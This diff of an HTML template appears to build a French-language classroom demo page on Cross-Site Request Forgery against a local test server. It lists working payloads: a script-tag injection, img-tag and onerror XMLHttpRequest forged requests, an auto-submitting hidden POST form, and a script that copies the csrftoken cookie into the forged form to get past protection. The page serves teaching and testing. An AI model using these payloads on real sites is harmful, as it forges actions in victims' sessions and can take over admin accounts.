@@ -4,72 +4,188 @@
 
 
     <div class="container">
-     <div id="accordion">
-        <div class="card">
-            <div class="card-header" id="headingOne">
-                <h5 class="mb-0">
-                    <button class="btn btn-link" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true"
-                            aria-controls="collapseOne">
-                        Collapsible Group Item #1
-                    </button>
-                </h5>
-            </div>
+        <br>
+        <h1>Cross Site Request Forgery</h1>
+        <br>
+        <div id="accordion">
+            <div class="card">
+                <div class="card-header" id="headingOne">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link" data-toggle="collapse" data-target="#collapseOne"
+                                aria-expanded="true"
+                                aria-controls="collapseOne">
+                            <b>1. Présentation</b>
+                        </button>
+                    </h5>
+                </div>
 
-            <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordion">
-                <div class="card-body">
-                    Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3
-                    wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum
-                    eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla
-                    assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt
-                    sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer
-                    farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus
-                    labore sustainable VHS.
+                <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordion">
+                    <div class="card-body">
+                        Présentation rapide du site web
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header" id="headingBdi">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link" data-toggle="collapse" data-target="#collapseBdi"
+                                aria-expanded="false"
+                                aria-controls="collapseBdi">
+                            <b>2. Le problème</b>
+                        </button>
+                    </h5>
+                </div>
+
+                <div id="collapseBdi" class="collapse" aria-labelledby="headingBdi" data-parent="#accordion">
+                    <div class="card-body">
+                        Le principe d'une attaque CSRF
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header" id="headingAsd">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseAsd"
+                                aria-expanded="false" aria-controls="collapseAsd">
+                            <b>3. Interprétation de balises dans les messages</b>
+                        </button>
+                    </h5>
+                </div>
+                <div id="collapseAsd" class="collapse" aria-labelledby="headingAsd" data-parent="#accordion">
+                    <div class="card-body">
+                        Démonstration de l'appel avec une balise &lt;script&gt;
+                        <br>
+                        Uniquement afin de faciliter les tests :
+                        <br>
+                        <pre>
+                            &lt;script&gt;alert('ALED')&lt;/script&gt;
+                        </pre>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header" id="headingTwo">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseTwo"
+                                aria-expanded="false" aria-controls="collapseTwo">
+                            <b>4. Attaque via une balise img</b>
+                        </button>
+                    </h5>
+                </div>
+                <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordion">
+                    <div class="card-body">
+                        Démonstration de l'appel avec une balise &lt;img&gt;
+                        <br>
+                        <pre>
+                            &lt;img src="http://127.0.0.1:8000/csrf/save_comment?body=HACKED"&gt;
+                        </pre>
+                        <br>
+                        Variante, sans src:
+                        <br>
+                        <pre>
+                            &lt;img src="" onerror="a = new XMLHttpRequest(); a.open('GET', 'http://127.0.0.1:8000/csrf/save_comment?body=NOSRCHACKED'); a.send();"&gt;
+                        </pre>
+                        <br>
+                        Limitation de cet appel : GET
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header" id="headingLdj">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseLdj"
+                                aria-expanded="false" aria-controls="collapseLdj">
+                            <b>5. Attaque via POST</b>
+                        </button>
+                    </h5>
+                </div>
+                <div id="collapseLdj" class="collapse" aria-labelledby="headingLdj" data-parent="#accordion">
+                    <div class="card-body">
+                        Démonstration de l'appel avec une balise &lt;form&gt;
+                        <br>
+                        Permet de gérer simplement un POST
+                        <br>
+                        <br>
+                        <pre>
+                            &lt;form method='POST' action='http://127.0.0.1:8000/csrf/save_comment_post' id="csrf-form"&gt;
+                              &lt;input type='hidden' name='body' value='HACKED FROM FORM'&gt;
+                              &lt;input type='submit' value='submit'&gt;
+                            &lt;/form&gt;
+                            &lt;script&gt;document.getElementById("csrf-form").submit()&lt;/script&gt;
+                        </pre>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header" id="headingThree">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseThree"
+                                aria-expanded="false" aria-controls="collapseThree">
+                            <b>6. Un exemple de finalité</b>
+                        </button>
+                    </h5>
+                </div>
+                <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordion">
+                    <div class="card-body">
+                        Changer le mot de passe de l'admin au lieu de poster des messages
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header" id="headingBku">
+                    <h5 class="mb-0">
+                        <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseBku"
+                                aria-expanded="false" aria-controls="collapseBku">
+                            <b>7. Contrer ce CSRF</b>
+                        </button>
+                    </h5>
+                </div>
+                <div id="collapseBku" class="collapse" aria-labelledby="headingBku" data-parent="#accordion">
+                    <div class="card-body">
+                        Possibilité de contrer le CSRF tel que montré
+                        <br>
+                        Exemple:
+                        <br>
+                        <pre>
+                            &lt;form method='POST' action='http://127.0.0.1:8000/csrf/save_comment_post' id="csrf-form"&gt;
+                              &lt;input type='hidden' name='body' value='HACKED FROM FORM'&gt;
+                              &lt;input type='submit' value='submit'&gt;
+                            &lt;/form&gt;
+                            &lt;script&gt;
+                            function getCookie(cname) {
+                              var name = cname + "=";
+                              var decodedCookie = decodeURIComponent(document.cookie);
+                              var ca = decodedCookie.split(';');
+                              for(var i = 0; i &lt;ca.length; i++) {
+                                var c = ca[i];
+                                while (c.charAt(0) == ' ') {
+                                  c = c.substring(1);
+                                }
+                                if (c.indexOf(name) == 0) {
+                                  return c.substring(name.length, c.length);
+                                }
+                              }
+                              return "";
+                            }
+                            var csrftoken = getCookie('csrftoken');
+
+                            var newcsrf = document.createElement("input");
+                            newcsrf.type = "text";
+                            newcsrf.name = "csrfmiddlewaretoken";
+                            newcsrf.value = csrftoken;
+
+                            document.getElementById("csrf-form").appendChild(newcsrf);
+                            document.getElementById("csrf-form").submit();
+                            &lt;/script&gt;
+
+                        </pre>
+
+                        <br>
+                        Limitations de cette attaque
+                    </div>
                 </div>
             </div>
         </div>
-        <div class="card">
-            <div class="card-header" id="headingTwo">
-                <h5 class="mb-0">
-                    <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseTwo"
-                            aria-expanded="false" aria-controls="collapseTwo">
-                        Collapsible Group Item #2
-                    </button>
-                </h5>
-            </div>
-            <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordion">
-                <div class="card-body">
-                    Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3
-                    wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum
-                    eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla
-                    assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt
-                    sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer
-                    farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus
-                    labore sustainable VHS.
-                </div>
-            </div>
-        </div>
-        <div class="card">
-            <div class="card-header" id="headingThree">
-                <h5 class="mb-0">
-                    <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseThree"
-                            aria-expanded="false" aria-controls="collapseThree">
-                        Collapsible Group Item #3
-                    </button>
-                </h5>
-            </div>
-            <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordion">
-                <div class="card-body">
-                    Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3
-                    wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum
-                    eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla
-                    assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt
-                    sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer
-                    farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus
-                    labore sustainable VHS.
-                </div>
-            </div>
-        </div>
-    </div>
     </div>
 
 
